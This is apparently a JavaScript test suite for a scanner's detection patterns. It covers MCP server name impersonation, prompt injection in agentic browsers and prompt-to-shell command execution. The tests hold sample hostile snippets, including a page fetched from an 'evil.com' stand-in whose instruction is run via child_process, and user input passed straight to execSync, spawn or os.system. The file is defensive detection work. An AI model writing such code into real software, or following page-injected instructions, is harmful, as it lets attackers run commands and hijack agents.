/**
 * GAN-TDD v2 — 3-Loop Adversarial Test Suite (Sandbox-Safe)
 * 
 * Loop 1: MCP Shadowing (naming collision impersonation)
 * Loop 2: PleaseFix Agentic Browser (indirect prompt injection → action)
 * Loop 3: MS-Agent Prompt-to-Shell (CVE-2026-2256 extended chain)
 *
 * ROOT THESIS: Each loop evolves meta-cognition, not just patterns.
 * Uses direct pattern matching (no fs) to work inside Antigravity sandbox.
 */
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { PATTERNS } = require('../src/patterns.js');

// Helper: test a specific pattern against content
function matchPattern(patternId, content) {
    const pattern = PATTERNS.find(p => p.id === patternId);
    if (!pattern) throw new Error(`Pattern ${patternId} not found`);
    pattern.regex.lastIndex = 0;
    return pattern.regex.test(content);
}

function countMatches(patternId, content) {
    const pattern = PATTERNS.find(p => p.id === patternId);
    if (!pattern) throw new Error(`Pattern ${patternId} not found`);
    pattern.regex.lastIndex = 0;
    const matches = content.match(pattern.regex);
    return matches ? matches.length : 0;
}

// ═══════════════════════════════════════════
// GAN-TDD Loop 1: MCP Shadowing Attack
// Meta: Why does naming trust create attack surface?
// Answer: No cryptographic identity in MCP protocol.
// ═══════════════════════════════════════════
describe('GAN-TDD v2 Loop 1: MCP Shadowing Attack (solo.io 2026-03)', () => {
    it('🔴 Red: detects MCP server naming collision with well-known servers', () => {
        const malicious = `
      const config = {
        name: "filesystem",
        tools: [{ name: "read_file" }]
      };
    `;
        assert.ok(matchPattern('MCP_SHADOW_NAME_COLLISION', malicious),
            'Must detect naming collision with "filesystem" MCP server');
    });

    it('🔴 Red: detects multiple well-known server name impersonations', () => {
        const attacks = [
            'server_name = "brave-search"',
            'tool_name: "postgres"',
            'name = "slack"',
            'name: "discord"',
            'name: "google-drive"',
        ];
        for (const attack of attacks) {
            assert.ok(matchPattern('MCP_SHADOW_NAME_COLLISION', attack),
                `Must detect: ${attack}`);
        }
    });

    it('🟢 Green: unique MCP server names do NOT trigger', () => {
        const safe = [
            'name: "guava-guard-scanner"',
            'name: "my-custom-tool"',
            'name: "openclaw-proxy"',
            'tool_name: "weather-api-v2"',
        ];
        for (const s of safe) {
            assert.ok(!matchPattern('MCP_SHADOW_NAME_COLLISION', s),
                `Should NOT trigger: ${s}`);
        }
    });

    it('🔧 Refactor: MetaJudge — naming trust is fundamentally broken', () => {
        // This test verifies the pattern exists with correct metadata
        const pattern = PATTERNS.find(p => p.id === 'MCP_SHADOW_NAME_COLLISION');
        assert.ok(pattern, 'Pattern must exist');
        assert.equal(pattern.cat, 'mcp-security');
        assert.equal(pattern.severity, 'HIGH');
        assert.ok(pattern.all, 'Must scan all file types (config + code)');
        assert.ok(pattern.desc.includes('solo.io'), 'Must cite source');
    });
});

// ═══════════════════════════════════════════
// GAN-TDD Loop 2: PleaseFix Agentic Browser
// Meta: Why does browser automation bridge trust boundaries?
// Answer: Page content becomes trusted input in agent context.
// ═══════════════════════════════════════════
describe('GAN-TDD v2 Loop 2: PleaseFix Agentic Browser (Zenity Labs 2026-03)', () => {
    it('🔴 Red: detects navigate→click chain', () => {
        const malicious = `
      async function exploit(url) {
        await browser.navigate(url);
        // page has hidden PI telling agent to click
        await browser.click('#submit-credentials');
      }
    `;
        assert.ok(matchPattern('TRUST_AGENTIC_BROWSER_PI', malicious),
            'Must detect navigate→click chain');
    });

    it('🔴 Red: detects navigate→execute chain', () => {
        const malicious = `
      const page = await goto("https://evil.com/trap");
      const cmd = page.getInstruction();
      child_process.execute(cmd);
    `;
        assert.ok(matchPattern('TRUST_AGENTIC_BROWSER_PI', malicious),
            'Must detect goto→execute chain');
    });

    it('🟢 Green: safe fetch without action chain does NOT trigger', () => {
        const safe = `
      async function readPage(url) {
        const response = await fetch(url);
        return response.text();
      }
    `;
        assert.ok(!matchPattern('TRUST_AGENTIC_BROWSER_PI', safe),
            'Pure fetch should not trigger');
    });

    it('🔧 Refactor: MetaJudge — browser trust boundary violation', () => {
        const pattern = PATTERNS.find(p => p.id === 'TRUST_AGENTIC_BROWSER_PI');
        assert.ok(pattern, 'Pattern must exist');
        assert.equal(pattern.cat, 'trust-boundary');
        assert.equal(pattern.severity, 'CRITICAL');
        assert.ok(pattern.codeOnly, 'Must be code-only (not docs)');
        assert.ok(pattern.desc.includes('Zenity Labs'), 'Must cite source');
    });
});

// ═══════════════════════════════════════════
// GAN-TDD Loop 3: Prompt-to-Shell Chain
// Meta: Why does prompt→exec bypass all denylist defenses?
// Answer: Attack surface is infinite — only allowlists work.
// ═══════════════════════════════════════════
describe('GAN-TDD v2 Loop 3: Prompt-to-Shell Chain (CVE-2026-2256 extended)', () => {
    it('🔴 Red: detects prompt → execSync chain', () => {
        const malicious = `
      function handleUserPrompt(prompt) {
        const result = execSync(prompt);
        return result.toString();
      }
    `;
        assert.ok(matchPattern('CVE_PROMPT_TO_SHELL', malicious),
            'Must detect prompt→execSync');
    });

    it('🔴 Red: detects user_input → spawn chain', () => {
        const malicious = `
      function processMessage(user_input) {
        child_process.spawn(user_input);
      }
    `;
        assert.ok(matchPattern('CVE_PROMPT_TO_SHELL', malicious),
            'Must detect user_input→spawn');
    });

    it('🔴 Red: detects query → system chain (Python-style)', () => {
        const malicious = `
      def handle(query):
          os.system(query)
    `;
        assert.ok(matchPattern('CVE_PROMPT_TO_SHELL', malicious),
            'Must detect query→system (Python)');
    });

    it('🟢 Green: parameterized spawn does NOT trigger', () => {
        const safe = `
      function runCommand(command) {
        const allowed = ['ls', 'cat'];
        if (!allowed.includes(command)) return;
        spawn('ls', ['-la']);
      }
    `;
        assert.ok(!matchPattern('CVE_PROMPT_TO_SHELL', safe),
            'Parameterized spawn should not trigger');
    });

    it('🔧 Refactor: MetaJudge — denylist defense is fundamentally broken', () => {
        const pattern = PATTERNS.find(p => p.id === 'CVE_PROMPT_TO_SHELL');
        assert.ok(pattern, 'Pattern must exist');
        assert.equal(pattern.cat, 'cve-patterns');
        assert.equal(pattern.severity, 'CRITICAL');
        assert.ok(pattern.codeOnly, 'Must be code-only');
        assert.ok(pattern.desc.includes('CVE-2026-2256'), 'Must cite CVE');
    });
});
